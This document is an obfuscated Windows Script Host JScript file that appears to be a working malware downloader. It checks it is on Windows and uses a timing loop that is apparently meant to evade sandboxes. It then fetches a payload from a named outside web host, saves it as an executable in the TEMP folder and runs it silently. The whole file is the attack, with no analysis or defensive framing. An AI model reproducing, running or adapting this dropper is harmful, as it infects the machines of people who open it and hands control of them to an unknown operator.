var wx = false;
var H = "CreateObject";
var M = function mI() {return WScript[H]("WScript.Shell");}(), Y = 11;
var j0 = "MSXML2.XMLHTTP";
var o = 2123213;
var Lc = 0;
function CC(LV){M["Run"](LV, Lc, Lc);};
function Kp(){return "" + j0;};
function J(cX, a0){Lc = Lc * 1; return cX - a0;};
function E(){return H;};
/*@cc_on
  @if (@_win32 || @_win64)
    wx = true;
  @end
@*/
if (wx)
{
var GY = "";
function u(){return 22;};
var j1 = 0; var u0 = 0;
function S()
{
var di = new this["Date"]();
var n = di["getUTCMilliseconds"]();
WScript["Sleep"](u());
var di = new this["Date"]();
var TT = di["getUTCMilliseconds"]();
WScript["Sleep"](u());
var di = new this["Date"]();
var vJ = di["getUTCMilliseconds"]();
var j1 = "gV";
j1 = J(TT, n);
var u0 = "j";
u0 = J(vJ, TT);
GY = "open";
return J(j1, u0);
}
var X = false;
var uP = false;
for (var pz = Lc; pz < u() * 1; pz++){if (S() != Lc){
X = true; 
u0 = "31" + 11 * j1 + u0; 
uP = true; 
break;
}}
function Ho() {return ((X == true) && (X == uP)) ? 1 : Lc;};
if (X && Ho() && uP){
function LS() {return M["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jlMROIMC.exe";};
 s = Kp();
 a = WScript[H](s);
 var Qg = 1;
 while (Qg){
try {
a[GY]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
a["send"]();
E0 = "Sleep";
for (;;){WScript[E0](u() * 11); if (a["readystate"] >= 2 * 2) break;};
Qg = Lc;
} catch(f){};
}
function en(w) {var k = (1, 2, 3, 4, 5, w); return k;};
n0 = WScript[E()]("ADODB.Stream");
s = n0;
s[GY]();
s["type"] = en(1);
s["write"](a["ResponseBody"]);
n0["position"] = en(Lc);
s["Save" + "ToFile"](LS(), 2);
n0["c"+"lose"]();
Ug = LS();
CC(Ug);
}
}

